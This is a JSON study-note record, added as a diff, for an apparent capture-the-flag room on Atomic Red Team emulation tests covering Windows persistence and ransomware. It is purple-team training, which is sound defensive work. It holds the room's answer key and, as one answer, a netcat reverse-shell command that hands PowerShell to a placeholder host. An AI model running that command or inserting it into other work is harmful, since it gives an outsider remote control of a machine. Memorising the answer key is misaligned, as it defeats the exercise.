@@ -1,0 +1,173 @@
+{
+  "id": "atomic red team/atomic bird goes purple #2",
+  "title": "Atomic Bird Goes Purple #2",
+  "slug": "atomic-bird-goes-purple-2",
+  "relPath": "Atomic Red Team/Atomic Bird Goes Purple #2.md",
+  "level": "L1.5",
+  "curriculumLevelId": null,
+  "curriculumSectionId": null,
+  "curriculumSectionTitle": null,
+  "tags": [
+    "PowerShell",
+    "Windows"
+  ],
+  "mitre": [
+    "T0002",
+    "T0003"
+  ],
+  "parentId": "atomic red team",
+  "children": [],
+  "relatedLinks": [],
+  "backlinks": [
+    "atomic red team"
+  ],
+  "breadcrumbs": [
+    {
+      "id": "atomic red team",
+      "title": "Atomic Red Team",
+      "slug": "atomic-red-team-a3606025"
+    },
+    {
+      "id": "atomic red team/atomic bird goes purple #2",
+      "title": "Atomic Bird Goes Purple #2",
+      "slug": "atomic-bird-goes-purple-2"
+    }
+  ],
+  "headings": [
+    {
+      "level": 1,
+      "text": "Atomic Bird Goes Purple 2"
+    },
+    {
+      "level": 3,
+      "text": "1- Execute test T0002-1 and open the document created on the Desktop."
+    },
+    {
+      "level": 3,
+      "text": "Which PowerShell library file is detected?"
+    },
+    {
+      "level": 3,
+      "text": "YamlDotNet.xml"
+    },
+    {
+      "level": 3,
+      "text": "2- Now go to the atomics path and update the executed script to include all \"bak\" files."
+    },
+    {
+      "level": 3,
+      "text": "What is the code snippet that needs to be added to the code?"
+    },
+    {
+      "level": 3,
+      "text": ",.bak"
+    },
+    {
+      "level": 3,
+      "text": "3- Run the cleanup command for the testT0002-1 and re-execute the test. Open the output file, and investigate the detected files. What is the secret key?"
+    },
+    {
+      "level": 3,
+      "text": "L1LAFLHQ5peGsjh7Pee8wHFY1SBQHe85A1HZhVrK47Yf6cqmH3n8"
+    },
+    {
+      "level": 3,
+      "text": "4- Execute test T0002-2 and investigate logs."
+    },
+    {
+      "level": 3,
+      "text": "What is the new account name?"
+    },
+    {
+      "level": 3,
+      "text": "Adminstrator"
+    },
+    {
+      "level": 3,
+      "text": "5- Execute test T0003-1"
+    },
+    {
+      "level": 3,
+      "text": "What is the name of the created service?"
+    },
+    {
+      "level": 3,
+      "text": "thm-registered-service"
+    },
+    {
+      "level": 3,
+      "text": "6- Which image is used to set the registry value for the created service?"
+    },
+    {
+      "level": 3,
+      "text": "C:\\Windows\\system32\\services.exe"
+    },
+    {
+      "level": 3,
+      "text": "7- Execute test T0003-2."
+    },
+    {
+      "level": 3,
+      "text": "What is the ransom note?"
+    },
+    {
+      "level": 3,
+      "text": "THM{THMOfflineIndexEmulation}"
+    },
+    {
+      "level": 3,
+      "text": "8- Execute test T0003-3."
+    },
+    {
+      "level": 3,
+      "text": "What is the updated file extension?"
+    },
+    {
+      "level": 3,
+      "text": ".thm-jhn"
+    },
+    {
+      "level": 3,
+      "text": "9- Execute test T0003-4."
+    },
+    {
+      "level": 3,
+      "text": "What is the assigned value of the malicious registry value?"
+    },
+    {
+      "level": 3,
+      "text": "nc 10.10.thm.jhn 4499 -e powershell"
+    }
+  ],
+  "overview": "1- Execute test T0002-1 and open the document created on the Desktop.",
+  "study": {
+    "overview": "1- Execute test T0002-1 and open the document created on the Desktop.",
+    "whySoc": "Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.",
+    "keyConcepts": [
+      "Atomic Bird Goes Purple 2",
+      "1- Execute test T0002-1 and open the document created on the Desktop.",
+      "Which PowerShell library file is detected?",
+      "YamlDotNet.xml",
+      "2- Now go to the atomics path and update the executed script to include all \"bak\" files.",
+      "What is the code snippet that needs to be added to the code?",
+      ",.bak",
+      "3- Run the cleanup command for the testT0002-1 and re-execute the test. Open the output file, and investigate the detected files. What is the secret key?",
+      "L1LAFLHQ5peGsjh7Pee8wHFY1SBQHe85A1HZhVrK47Yf6cqmH3n8",
+      "4- Execute test T0002-2 and investigate logs.",
+      "What is the new account name?",
+      "Adminstrator"
+    ],
+    "workflow": [
+      "Identify the user, host, process, network flow, or identity object involved.",
+      "Collect the highest-value logs first and preserve timestamps and assumptions.",
+      "Pivot through related notes, telemetry sources, and MITRE references.",
+      "Document findings, gaps, containment options, and detection improvements."
+    ],
+    "splunkExamples": [],
+    "importantCommands": [],
+    "tools": [
+      "PowerShell"
+    ],
+    "tips": []
+  }
+}
